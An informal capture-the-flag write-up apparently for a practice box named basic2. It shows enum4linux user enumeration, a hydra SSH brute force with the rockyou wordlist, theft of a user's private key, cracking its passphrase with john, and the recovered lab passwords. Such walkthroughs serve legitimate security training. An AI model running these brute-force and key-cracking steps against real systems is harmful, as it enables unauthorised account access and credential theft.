first after using gobuster to find firectories lets find  a username and passwd using enum4linux is a Linux tool used for enumerating information from Windows and Samba systems. It gathers details like:

    Users and groups
    Shared resources (shares)
    Password policies
    Operating system versions
    RID cycling (to guess user accounts)
    SIDs and domain information
    
    
    from nmap we found that the machine is running smb 
    
    {///////
    
    
    
    \\\\\\}
    
    now lets use enum4linux to get usernames 
    
    enum4linux is a reconnaissance and enumeration tool designed for extracting information from Windows and Samba servers using SMB (Server Message Block). It's commonly used in penetration testing and CTF challenges to gather intelligence about a target system.
    
    by using enum4linux -a ip@
 
we found  2 usernames 

[I] Found new SID: 
S-1-22-1

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

by using now hydra on ssh and the wordlist rockyou we found a password 
which is armando 


the digging got me to the kay ssh repository 

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ ls
jan@basic2:~$ pwd
/home/jan
jan@basic2:~$ cd ..
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls
pass.bak
jan@basic2:/home/kay$ ls -ls 
total 4
4 -rw------- 1 kay kay 57 Apr 23  2018 pass.bak
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ less pass.bak 
pass.bak: Permission denied
jan@basic2:/home/kay$ sudo less pass.bak 
[sudo] password for jan: 
jan is not in the sudoers file.  This incident will be reported.
jan@basic2:/home/kay$ sudo -l
[sudo] password for jan: 
Sorry, user jan may not run sudo on basic2.


i copied the id_rsa private key from the .ssh 

then used ssh2john on my pc to transfer it to a file 

 sudo ssh2john kay.txt > kaypass.txt

then cracked it 

using jhon

john --wordlist=/usr/share/wordlists/rockyou.txt kaypass.txt 

i got 
 Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay.txt)     
1g 0:00:00:00 DONE (2025-03-12 17:37) 20.00g/s 1655Kp/s 1655Kc/s 1655KC/s beibei..banana22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 



then with the original file that has the private key i used ssh to login since i got the pass phrase using jhon 

ssh -i kay.txt kay@10.10.39.249 
Enter passphrase for key 'kay.txt': 
Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass 
cat: pass: No such file or directory
kay@basic2:~$ cat pass.txt
cat: pass.txt: No such file or directory
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ 





    
    
